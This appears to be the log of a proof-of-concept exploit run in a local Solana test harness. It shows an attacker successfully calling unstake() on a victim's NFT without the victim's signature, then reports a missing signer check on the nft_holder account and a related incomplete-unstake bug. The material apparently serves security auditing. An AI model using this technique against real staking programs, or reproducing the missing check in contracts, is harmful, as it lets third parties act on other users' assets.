===========================================================
 EXPLOIT: Missing Signer on Unstake in solana-staking
 Target: skinflip_staking::unstake()
 Binary: skinflip_staking.so (compiled from real program)
===========================================================

[2026-02-13T19:20:34.004124744Z INFO  solana_program_test] "skinflip_staking" SBF program from /home/user/anchor-shield-v2/exploits/skinflip_staking.so, modified 6 minutes, 59 seconds, 763 ms, 570 µs and 354 ns ago
[1] Genesis state:
    Victim (NFT holder): 83BLtUGY1Q2C... (NOT signing)
    Attacker:            H6dTafTpZxrf... (sends tx)
    Staked NFTs: 1
    NFT staked 24 hours ago

[2] EXPLOIT: Attacker calls unstake() for victim's NFT...
    Attacker provides victim's pubkey as nft_holder AccountInfo
    No signature from victim is required

[2026-02-13T19:20:34.755664996Z DEBUG solana_runtime::message_processor::stable_log] Program 8PwEDGC8wVDy1GpMJ3wzngKnViFpHvWEABsuMBVjX5at invoke [1]
[2026-02-13T19:20:34.756639904Z DEBUG solana_runtime::message_processor::stable_log] Program log: Instruction: Unstake
[2026-02-13T19:20:34.756732062Z DEBUG solana_runtime::message_processor::stable_log] Program log: Unstake SkinFlip NFT
[2026-02-13T19:20:34.756815508Z DEBUG solana_runtime::message_processor::stable_log] Program log: NFT: BxzsfL8T8uB7TqVFuopdnKxDnbREnqUXcMG36tQ4L3rE
[2026-02-13T19:20:34.756872937Z DEBUG solana_runtime::message_processor::stable_log] Program log: NFT holder: 83BLtUGY1Q2CaJBSdvMhTJb4qMZpSWHEXhZkcecmTPSs
[2026-02-13T19:20:34.756902996Z DEBUG solana_runtime::message_processor::stable_log] Program log: Staked nfts 1
[2026-02-13T19:20:34.756934078Z DEBUG solana_runtime::message_processor::stable_log] Program log: Staked at 1770924033, time diff: 86401
[2026-02-13T19:20:34.757130538Z DEBUG solana_runtime::message_processor::stable_log] Program 8PwEDGC8wVDy1GpMJ3wzngKnViFpHvWEABsuMBVjX5at consumed 28054 of 200000 compute units
[2026-02-13T19:20:34.757178426Z DEBUG solana_runtime::message_processor::stable_log] Program 8PwEDGC8wVDy1GpMJ3wzngKnViFpHvWEABsuMBVjX5at success
[3] Result: unstake() SUCCEEDED without victim's signature

>>> EXPLOIT CONFIRMED: missing signer check on unstake <<<

    UnstakeInstructionStruct.nft_holder: AccountInfo (line 159)
    Should be: Signer<'info>

    IMPACT: Any third party can trigger unstake for any user's NFT.
    Combined with the incomplete unstake bug:
    - Attacker triggers unstake → function returns Ok()
    - NFT stays in vault (incomplete unstake)
    - staked_nfts counter unchanged
    - Could manipulate staking rewards/timing if program had reward logic

===========================================================
EXIT CODE: 
EXIT CODE: 0
